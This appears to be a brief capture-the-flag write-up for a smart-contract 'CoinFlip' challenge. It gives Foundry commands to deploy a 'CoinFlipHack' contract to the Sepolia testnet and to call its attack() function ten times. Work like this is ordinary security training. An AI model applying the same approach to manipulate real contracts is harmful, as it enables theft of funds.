# CoinFlip Solution

Deploy `CoinFlipHack`:

```
forge create CoinFlipHack --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey --constructor-args `ìnstanceAddress`
```

Call the `attack()` function 10 times without reverts:

```
cast send `coinFlipHackAddress` "attack()" --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
